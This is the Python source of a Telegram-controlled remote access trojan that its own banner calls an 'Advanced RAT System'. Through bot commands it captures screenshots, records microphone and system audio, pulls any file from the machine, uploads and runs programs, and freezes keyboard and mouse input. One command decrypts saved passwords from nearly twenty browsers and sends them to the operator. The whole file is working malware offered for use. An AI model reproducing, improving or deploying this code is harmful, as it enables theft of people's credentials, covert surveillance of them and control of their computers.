import os
import sys
import platform
import psutil
from datetime import datetime
from telegram import Update, Document, ChatPermissions
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, JobQueue
from dotenv import load_dotenv
from colorama import init, Fore, Style
from PIL import ImageGrab, Image
import pygetwindow as gw
import mss
import mss.tools
import ctypes
import time
import sounddevice as sd
import soundfile as sf
import numpy as np
import subprocess
import json
import shutil
import sqlite3
import base64
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from ctypes import windll, c_bool, byref
import keyboard
import mouse
import asyncio
import re

# Show console window
if sys.executable.endswith('pythonw.exe'):
    import ctypes
    ctypes.windll.kernel32.AllocConsole()
    sys.stdout = open('CONOUT$', 'w')
    sys.stderr = open('CONOUT$', 'w')

init()
load_dotenv()

if not os.getenv('TELEGRAM_TOKEN') or not os.getenv('AUTHORIZED_USER_ID'):
    print("Credentials not found!")
    exit(1)

TOKEN = os.getenv('TELEGRAM_TOKEN')
AUTHORIZED_USER_ID = int(os.getenv('AUTHORIZED_USER_ID'))

HELP_MESSAGE = """
┏━━━━━ Bot Commands ━━━━━┓

⚡ System Commands
┣ /status - System Info
┣ /apps - Running Apps
┣ /run - Execute Program
┣ /browser - Dump Browser Data
┣ /freeze - Freeze Input
┣ /unfreeze - Unfreeze Input
┣ /timer - Set Lock Timer
┗ /screenshot - Take Shot

🛡️ Security
┣ /lock - Lock PC
┣ /sleep - Sleep PC
┣ /wake - Wake PC
┗ /shutdown - Power Off

🔧 Utilities
┣ /write - Create Note
┣ /clear - Clear Chat
┣ /download - Get File from PC
┣ /upload - Send File to PC
┣ /record - Record Audio (Mic+System)
┗ /help - Show Commands

👤 Contact
┗ /contact - Developer Info

Made by flash ⚡
"""

async def get_status_message():
    try:
        # Get system info
        boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        cpu_usage = psutil.cpu_percent()
        ram = psutil.virtual_memory()
        ram_used = f"{ram.used / (1024 * 1024 * 1024):.1f}GB"
        ram_total = f"{ram.total / (1024 * 1024 * 1024):.1f}GB"
        
        # Check battery status safely
        battery = psutil.sensors_battery()
        power_status = "Connected" if battery and battery.power_plugged else "On Battery" if battery else "No Battery"
        
        status_msg = f"""┏━━━━━ System Status ━━━━━┓

🔹 OS: {platform.system()} {platform.release()}
⏰ Online: {boot_time}
📊 CPU: {cpu_usage}%
💾 RAM: {ram_used}/{ram_total}
⚡ Power: {power_status}

┗━━━━━━━━━━━━━━━━━━━━━┛"""
        return status_msg
    except Exception as e:
        return f"Error getting status: {str(e)}"

async def show_stats_and_help(update: Update):
    """Show status and help message after command execution"""
    try:
        status_msg = await get_status_message()
        combined_message = status_msg + "\n\n" + HELP_MESSAGE
        await update.message.reply_text(combined_message)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def is_authorized(update: Update) -> bool:
    """Check if user is authorized"""
    return update.effective_user.id == AUTHORIZED_USER_ID

async def block_unauthorized(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Block unauthorized users"""
    if not await is_authorized(update):
        await update.message.reply_text("❌ Access denied. Unauthorized user.")
        return False
    return True

async def shutdown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        await update.message.reply_text("❌ Not authorized.")
        return
        
    try:
        await update.message.reply_text("🔌 Shutting down the system...")
        os.system("shutdown /s /t 0")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")
    await show_stats_and_help(update)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        await update.message.reply_text("❌ Not authorized.")
        return
        
    try:
        welcome_msg = f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       🚀 FLASH REMOTE SYSTEM 🚀      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

🎯 Bot is online and ready!
🔐 User authenticated: {update.effective_user.first_name}
⚡ All systems operational

{HELP_MESSAGE}
"""
        await update.message.reply_text(welcome_msg)
        
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        await update.message.reply_text("❌ Not authorized.")
        return
    
    try:
        await update.message.reply_text(HELP_MESSAGE)
        
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")
    await show_stats_and_help(update)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        await update.message.reply_text("❌ Not authorized.")
        return
    
    try:
        status_msg = await get_status_message()
        await update.message.reply_text(status_msg)
        
    except Exception as e:
        await update.message.reply_text(f"Error getting status: {str(e)}")
    await show_stats_and_help(update)

async def apps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        await update.message.reply_text("❌ Not authorized.")
        return
        
    try:
        processes = []
        for proc in psutil.process_iter(['name', 'cpu_percent', 'memory_percent']):
            try:
                if proc.info['cpu_percent'] > 0:
                    processes.append(proc.info)
            except:
                pass
                
        processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
        
        msg = ("📱 Running Applications:\n"
               "➖➖➖➖➖➖➖➖\n")
        for i, proc in enumerate(processes[:10], 1):
            msg += f"{i}. {proc['name']}\n"
            msg += f"   CPU: {proc['cpu_percent']}% | RAM: {proc['memory_percent']:.1f}%\n"
        
        await update.message.reply_text(msg)
        
    except Exception as e:
        await update.message.reply_text(f"Error listing apps: {str(e)}")
    await show_stats_and_help(update)

async def screenshot_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        await update.message.reply_text("❌ Not authorized.")
        return
        
    try:
        with mss.mss() as sct:
            # Get all monitors
            for monitor_number, monitor in enumerate(sct.monitors[1:], 1):  # Skip first as it's combined view
                # Take screenshot of this monitor
                screenshot = sct.grab(monitor)
                screenshot_path = f"screen_{monitor_number}.png"
                
                # Save screenshot
                mss.tools.to_png(screenshot.rgb, screenshot.size, output=screenshot_path)
                
                # Send to telegram
                with open(screenshot_path, 'rb') as photo:
                    await update.message.reply_photo(
                        photo=photo, 
                        caption=f"📸 Monitor {monitor_number} Screenshot"
                    )
                
                # Cleanup
                os.remove(screenshot_path)
                
    except Exception as e:
        await update.message.reply_text(f"Error capturing screenshot: {str(e)}")
    await show_stats_and_help(update)

async def write_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
    
    temp_file = None
    try:
        text = ' '.join(context.args)
        if not text:
            await update.message.reply_text("Usage: /write <text>\nExample: /write Hello World")
            return
            
        # Create temp file with absolute path
        temp_file = os.path.join(os.getcwd(), "note.txt")
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(text)
            
        # Use subprocess to open notepad and wait for it to close
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 1  # SW_SHOWNORMAL
        
        # Wait for notepad to close
        subprocess.run(['notepad.exe', temp_file], startupinfo=startupinfo, check=True)
        
        # Delete the file after notepad closes
        if os.path.exists(temp_file):
            os.remove(temp_file)
            
        await update.message.reply_text("✅ Note closed and cleaned up!")
        
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")
        # Cleanup in case of error
        if temp_file and os.path.exists(temp_file):
            os.remove(temp_file)
    await show_stats_and_help(update)

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    try:
        message_id = update.message.message_id
        chat_id = update.message.chat_id
        
        for i in range(message_id, 0, -1):
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=i)
            except:
                break
                
        msg = await update.message.reply_text("✨ Chat cleared!")
        await msg.delete(timeout=3)
    except Exception as e:
        await update.message.reply_text(f"Error clearing chat: {str(e)}")
    await show_stats_and_help(update)

async def lock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    try:
        ctypes.windll.user32.LockWorkStation()
        await update.message.reply_text("🔒 PC locked successfully!")
    except Exception as e:
        await update.message.reply_text(f"Error locking PC: {str(e)}")
    await show_stats_and_help(update)

async def sleep_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    try:
        await update.message.reply_text("💤 Putting PC to sleep...")
        ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
    except Exception as e:
        await update.message.reply_text(f"Error putting PC to sleep: {str(e)}")
    await show_stats_and_help(update)

async def wake_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    try:
        await update.message.reply_text("⚡ Waking up PC...")
        keyboard.press_and_release('shift')  # Simulate key press to wake
        time.sleep(1)  # Wait for system to respond
        await update.message.reply_text("✅ PC is now awake!")
    except Exception as e:
        await update.message.reply_text(f"Error waking PC: {str(e)}")
    await show_stats_and_help(update)

async def contact_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact_info = """
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃      👨‍💻 DEVELOPER INFO     ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🔥 Creator
┌─────────────────────────────────┐
│ 👤 Name: flash                  │
│ ⚡ Status: Elite Developer       │
│ 🎯 Specialty: Advanced Systems  │
└─────────────────────────────────┘

🌐 Social Links
┌─────────────────────────────────┐
│ 💻 GitHub: github.com/9dmx      │
│ 🎮 Discord: 9dmx                │
│ 🌍 Website: https://973.wtf     │
└─────────────────────────────────┘

╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃    🚀 Advanced RAT System     ┃
┃       Version 1.2             ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
    await update.message.reply_text(contact_info, disable_web_page_preview=True)
    await show_stats_and_help(update)

async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    try:
        # Get filepath from command argument
        if not context.args:
            await update.message.reply_text("Please provide a file path to download.")
            return
            
        filepath = ' '.join(context.args)
        if not os.path.exists(filepath):
            await update.message.reply_text("❌ File not found!")
            return
            
        # Send file to user
        with open(filepath, 'rb') as file:
            await update.message.reply_document(
                document=file,
                filename=os.path.basename(filepath),
                caption=f"📥 File: {os.path.basename(filepath)}"
            )
            
    except Exception as e:
        await update.message.reply_text(f"Error downloading file: {str(e)}")
    await show_stats_and_help(update)

async def handle_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    try:
        if not update.message.document:
            await update.message.reply_text("Please send a file to upload.")
            return
            
        file = await context.bot.get_file(update.message.document.file_id)
        filename = update.message.document.file_name
        
        # Download and save the file
        await file.download_to_drive(filename)
        await update.message.reply_text(f"✅ File uploaded successfully: {filename}")
    except Exception as e:
        await update.message.reply_text(f"Error uploading file: {str(e)}")
    await show_stats_and_help(update)
    await show_stats_and_help(update)

async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    await update.message.reply_text("""
📤 To upload files:
1. Just send the file directly to this chat
2. Or attach file with /upload command

Files will be saved in the bot's directory.
""")
    await show_stats_and_help(update)

async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    try:
        duration = 10  # Default recording duration in seconds
        if context.args and context.args[0].isdigit():
            duration = min(int(context.args[0]), 30)  # Max 30 seconds
            
        await update.message.reply_text(f"🎙️ Recording audio for {duration} seconds...")
        
        # Setup audio parameters
        samplerate = 44100
        channels = 2
        
        # Record both mic and system audio simultaneously
        mic_recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels)
        sys_recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels, dtype='float32')
        sd.wait()  # Wait for recordings to complete
        
        # Mix the recordings
        mixed_recording = mic_recording + sys_recording
        
        # Save mixed recording
        filename = "audio_recording.wav"
        sf.write(filename, mixed_recording, samplerate)
        
        # Send recording
        with open(filename, 'rb') as audio:
            await update.message.reply_audio(
                audio=audio,
                caption="🎙️ Mixed Audio Recording (Mic + System)"
            )
            
        # Cleanup
        os.remove(filename)
    except Exception as e:
        await update.message.reply_text(f"Error recording audio: {str(e)}")
    await show_stats_and_help(update)

async def run_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    try:
        if not context.args:
            await update.message.reply_text("Please provide program name or path to execute.")
            return
            
        program = ' '.join(context.args)
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        subprocess.Popen(program, startupinfo=startupinfo)
        await update.message.reply_text(f"✅ Executed: {program}")
    except Exception as e:
        await update.message.reply_text(f"Error executing program: {str(e)}")
    await show_stats_and_help(update)

# Global variables to track freeze state
input_frozen = False
hook_ids = []

async def freeze_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    global input_frozen, hook_ids
    
    try:
        if input_frozen:
            await update.message.reply_text("🔒 Input devices are already frozen!")
            return
            
        # Clear any existing hooks first
        keyboard.unhook_all()
        mouse.unhook_all()
        hook_ids.clear()
        
        # Method 1: Windows API BlockInput
        windll.user32.BlockInput(c_bool(True))
        
        # Method 2: Hook all events with suppress
        def suppress_event(event):
            return False  # Suppress all events
            
        # Add hooks and store them
        hook_ids.append(keyboard.hook(suppress_event, suppress=True))
        hook_ids.append(mouse.hook(suppress_event, suppress=True))
        
        input_frozen = True
        await update.message.reply_text("🔒 Input devices frozen! Use /unfreeze to restore.")
        
    except Exception as e:
        await update.message.reply_text(f"Error freezing input: {str(e)}")
    await show_stats_and_help(update)

async def unfreeze_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    global input_frozen, hook_ids
    
    try:
        # Always try to unfreeze regardless of state
        # Method 1: Unblock Windows API
        windll.user32.BlockInput(c_bool(False))
        
        # Method 2: Remove all hooks forcefully
        try:
            keyboard.unhook_all()
            mouse.unhook_all()
        except: pass
        
        # Method 3: Clear our hook list
        hook_ids.clear()
        
        # Method 4: Force unblock with system calls
        try:
            subprocess.run(['taskkill', '/f', '/im', 'python.exe'], 
                         capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass
        
        # Method 5: Restart input services
        try:
            subprocess.run(['net', 'stop', 'Themes'], capture_output=True)
            subprocess.run(['net', 'start', 'Themes'], capture_output=True)
        except: pass
        
        input_frozen = False
        await update.message.reply_text("🔓 Input devices unfrozen! If still frozen, restart the bot.")
        
    except Exception as e:
        await update.message.reply_text(f"Error unfreezing input: {str(e)}")
    await show_stats_and_help(update)

# Add browser paths
BROWSERS = {
    'avast': f'{os.getenv("LOCALAPPDATA")}\\AVAST Software\\Browser\\User Data',
    'amigo': f'{os.getenv("LOCALAPPDATA")}\\Amigo\\User Data',
    'torch': f'{os.getenv("LOCALAPPDATA")}\\Torch\\User Data',
    'kometa': f'{os.getenv("LOCALAPPDATA")}\\Kometa\\User Data',
    'orbitum': f'{os.getenv("LOCALAPPDATA")}\\Orbitum\\User Data',
    'cent-browser': f'{os.getenv("LOCALAPPDATA")}\\CentBrowser\\User Data',
    '7star': f'{os.getenv("LOCALAPPDATA")}\\7Star\\7Star\\User Data',
    'sputnik': f'{os.getenv("LOCALAPPDATA")}\\Sputnik\\Sputnik\\User Data',
    'vivaldi': f'{os.getenv("LOCALAPPDATA")}\\Vivaldi\\User Data',
    'chrome-canary': f'{os.getenv("LOCALAPPDATA")}\\Google\\Chrome SxS\\User Data',
    'chrome': f'{os.getenv("LOCALAPPDATA")}\\Google\\Chrome\\User Data',
    'epic-privacy-browser': f'{os.getenv("LOCALAPPDATA")}\\Epic Privacy Browser\\User Data',
    'microsoft-edge': f'{os.getenv("LOCALAPPDATA")}\\Microsoft\\Edge\\User Data',
    'uran': f'{os.getenv("LOCALAPPDATA")}\\uCozMedia\\Uran\\User Data',
    'yandex': f'{os.getenv("LOCALAPPDATA")}\\Yandex\\YandexBrowser\\User Data',
    'brave': f'{os.getenv("LOCALAPPDATA")}\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': f'{os.getenv("LOCALAPPDATA")}\\Iridium\\ User Data',
    'opera': f'{os.getenv("APPDATA")}\\Opera Software\\Opera Stable',
    'opera-gx': f'{os.getenv("APPDATA")}\\Opera Software\\Opera GX Stable',
}

def get_master_key(path: str) -> bytes:
    try:
        if not os.path.exists(path): return None
        if not os.path.exists(os.path.join(path, "Local State")): return None
        
        with open(os.path.join(path, "Local State"), "r", encoding='utf-8') as f:
            c = f.read()
        local_state = json.loads(c)
        
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # Remove DPAPI prefix
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    except: return None

def decrypt_password(buff: bytes, master_key: bytes) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # Remove suffix bytes
        return decrypted_pass
    except: return None

async def get_chrome_login_data():
    results = []
    for browser_name, browser_path in BROWSERS.items():
        if not os.path.exists(browser_path): continue
        master_key = get_master_key(browser_path)
        if not master_key: continue
            
        paths = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
        if browser_name in ['opera', 'opera-gx']: paths = [""]
            
        for profile in paths:
            login_db = os.path.join(browser_path, profile, 'Login Data')
            if not os.path.exists(login_db): continue
                
            temp_db = f'login_db_{browser_name}_{profile.replace(" ", "_")}.db'
            try:
                shutil.copy2(login_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2]: continue    
                    if password := decrypt_password(row[2], master_key):
                        results.append({
                            'browser': f'{browser_name} ({profile})',
                            'url': row[0],
                            'username': row[1],
                            'password': password
                        })
                cursor.close()
                conn.close()
            except Exception as e:
                # Silent error handling for locked databases
                pass
            finally:
                # Always cleanup temp file
                if os.path.exists(temp_db):
                    try:
                        os.remove(temp_db)
                    except:
                        pass
    
    return results

async def browser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    try:
        await update.message.reply_text("🔍 Scanning browser data...")
        results = await get_chrome_login_data()
        
        if isinstance(results, str):  # Error occurred
            await update.message.reply_text(results)
            return
            
        # Save results to file        
        filename = "browser_data.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            for entry in results:
                f.write(f"\nBrowser: {entry['browser']}\n")
                f.write(f"URL: {entry['url']}\n")
                f.write(f"Username: {entry['username']}\n")
                f.write(f"Password: {entry['password']}\n")
                f.write("-------------------\n")
                
        # Send file
        with open(filename, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=filename,
                caption="🔐 Browser Login Data"
            )
            
        # Cleanup
        os.remove(filename)
        
    except Exception as e:
        await update.message.reply_text(f"Error dumping browser data: {str(e)}")
    await show_stats_and_help(update)

async def timer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update):
        return
        
    try:
        print(f"DEBUG: Timer command received with args: {context.args}")
        
        if not context.args:
            await update.message.reply_text("""
⏰ Timer Usage Examples:
• /timer 30m - Lock in 30 minutes
• /timer 2h - Lock in 2 hours  
• /timer 1h30m - Lock in 1 hour 30 minutes
• /timer 45s - Lock in 45 seconds
• /timer 10 - Lock in 10 seconds (default)
""")
            return
            
        time_str = ' '.join(context.args).lower().strip()
        print(f"DEBUG: Parsing time string: '{time_str}'")
        total_seconds = 0
        
        # If it's just a number, treat it as seconds
        if time_str.isdigit():
            total_seconds = int(time_str)
            print(f"Parsed as plain number: {total_seconds} seconds")
        else:
            # Parse time string with units
            
            # Extract hours
            hour_match = re.search(r'(\d+)h', time_str)
            if hour_match:
                total_seconds += int(hour_match.group(1)) * 3600
            
            # Extract minutes
            min_match = re.search(r'(\d+)m', time_str)
            if min_match:
                total_seconds += int(min_match.group(1)) * 60
            
            # Extract seconds
            sec_match = re.search(r'(\d+)s', time_str)
            if sec_match:
                total_seconds += int(sec_match.group(1))
            
            print(f"Parsed time components: total={total_seconds} seconds")
            
        if total_seconds <= 0:
            await update.message.reply_text("❌ Invalid time! Please use format like: 30s, 5m, 1h, or 1h30m")
            return
            
        if total_seconds > 86400:  # Max 24 hours
            await update.message.reply_text("❌ Maximum timer is 24 hours!")
            return
            
        # Convert seconds back to readable format
        hours = total_seconds // 3600
        minutes = (total_seconds % 3600) // 60
        seconds = total_seconds % 60
        
        time_display = []
        if hours > 0: time_display.append(f"{hours}h")
        if minutes > 0: time_display.append(f"{minutes}m") 
        if seconds > 0: time_display.append(f"{seconds}s")
        time_display_str = ' '.join(time_display)
        
        # Send initial confirmation
        await update.message.reply_text(f"⏰ Timer ACTIVE! PC will FORCE LOCK in {time_display_str}")
        print(f"Timer started for {total_seconds} seconds ({time_display_str})")
        
        # For short timers (less than 60 seconds), just wait and lock
        if total_seconds <= 60:
            if total_seconds > 10:
                await asyncio.sleep(total_seconds - 10)
                await update.message.reply_text("⚠️ WARNING: PC will lock in 10 seconds!")
                await asyncio.sleep(10)
            else:
                await asyncio.sleep(total_seconds)
        else:
            # For longer timers, show progress updates
            intervals = []
            if total_seconds > 3600:  # More than 1 hour
                intervals.extend([total_seconds - 3600, total_seconds - 1800])  # 1h and 30m warnings
            if total_seconds > 900:  # More than 15 minutes
                intervals.append(total_seconds - 900)  # 15m warning
            if total_seconds > 300:  # More than 5 minutes
                intervals.append(total_seconds - 300)  # 5m warning
            if total_seconds > 60:  # More than 1 minute
                intervals.append(total_seconds - 60)  # 1m warning
            intervals.append(total_seconds - 10)  # 10s warning
            
            # Remove duplicates and sort
            intervals = sorted(list(set([i for i in intervals if i > 0])))
            
            elapsed = 0
            for interval in intervals:
                wait_time = interval - elapsed
                if wait_time > 0:
                    await asyncio.sleep(wait_time)
                    elapsed = interval
                    remaining = total_seconds - elapsed
                    
                    # Calculate remaining time display
                    r_hours = remaining // 3600
                    r_minutes = (remaining % 3600) // 60
                    r_seconds = remaining % 60
                    
                    r_display = []
                    if r_hours > 0: r_display.append(f"{r_hours}h")
                    if r_minutes > 0: r_display.append(f"{r_minutes}m")
                    if r_seconds > 0: r_display.append(f"{r_seconds}s")
                    
                    await update.message.reply_text(f"⚠️ WARNING: PC will lock in {' '.join(r_display)}!")
            
            # Final countdown
            remaining_time = total_seconds - elapsed
            if remaining_time > 0:
                await asyncio.sleep(remaining_time)
        
        # Force lock notification
        await update.message.reply_text("🚨 LOCKING PC NOW!")
        print("Executing lock commands...")
        
        # Force lock the PC with multiple methods
        try:
            # Method 1: Standard Windows lock
            print("Attempting standard lock...")
            ctypes.windll.user32.LockWorkStation()
            
            # Method 2: Force lock via rundll32
            print("Attempting rundll32 lock...")
            subprocess.run(['rundll32.exe', 'user32.dll,LockWorkStation'], 
                         creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Method 3: Block input briefly to ensure lock
            print("Blocking input briefly...")
            windll.user32.BlockInput(c_bool(True))
            await asyncio.sleep(0.1)
            windll.user32.BlockInput(c_bool(False))
            
        except Exception as e:
            print(f"Lock method failed: {e}")
        
        # Confirm lock
        await update.message.reply_text("🔒 PC FORCE LOCKED SUCCESSFULLY!")
        print("Timer completed and PC locked!")
        
    except ValueError as e:
        await update.message.reply_text("❌ Invalid time format! Use: 2h30m, 45m, 30s, or just 60 (seconds)")
        print(f"Timer parsing error: {e}")
    except Exception as e:
        await update.message.reply_text(f"Error setting timer: {str(e)}")
        print(f"Timer error: {e}")
    await show_stats_and_help(update)

def main():
    try:
        app = ApplicationBuilder().token(TOKEN).build()
        
        # Add command handlers
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(CommandHandler("shutdown", shutdown_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(CommandHandler("apps", apps_command))
        app.add_handler(CommandHandler("screenshot", screenshot_command))
        app.add_handler(CommandHandler("write", write_command))
        app.add_handler(CommandHandler("clear", clear_command))
        app.add_handler(CommandHandler("lock", lock_command))
        app.add_handler(CommandHandler("sleep", sleep_command))
        app.add_handler(CommandHandler("wake", wake_command))
        app.add_handler(CommandHandler("download", download_command))
        app.add_handler(CommandHandler("upload", upload_command))
        app.add_handler(CommandHandler("record", record_command))
        app.add_handler(CommandHandler("run", run_command))
        app.add_handler(CommandHandler("browser", browser_command))
        app.add_handler(CommandHandler("freeze", freeze_command))
        app.add_handler(CommandHandler("unfreeze", unfreeze_command))
        app.add_handler(CommandHandler("timer", timer_command))
        app.add_handler(CommandHandler("contact", contact_command))
        app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, handle_upload))
        
        # Add handler for unauthorized users (optional - for debugging)
        app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, block_unauthorized))
        
        print("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print("┃       🚀 FLASH REMOTE SYSTEM 🚀      ┃")
        print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        
        # Animated startup sequence
        
        # Show messages one by one
        print("Bot starting...", end="", flush=True)
        time.sleep(1)
        print()
        
        print(f"Authorized User ID: {AUTHORIZED_USER_ID}", end="", flush=True)
        time.sleep(1)
        print()
        
        print(f"Token configured: {'Yes' if TOKEN else 'No'}", end="", flush=True)
        time.sleep(1)
        print()
        
        print("Starting polling...", end="", flush=True)
        time.sleep(1)
        print()
        
        # Clear screen and show final status
        time.sleep(1)
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print("┃       🚀 FLASH REMOTE SYSTEM 🚀      ┃")
        print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        print("┌─────────────────────────────────────────┐")
        print("│             🟢 Bot is active            │")
        print("└─────────────────────────────────────────┘")
        
        # Add error handler
        async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
            print(f"Exception while handling an update: {context.error}")
            import traceback
            traceback.print_exc()
        
        app.add_error_handler(error_handler)
        app.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        print(f"Error: {str(e)}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    main()
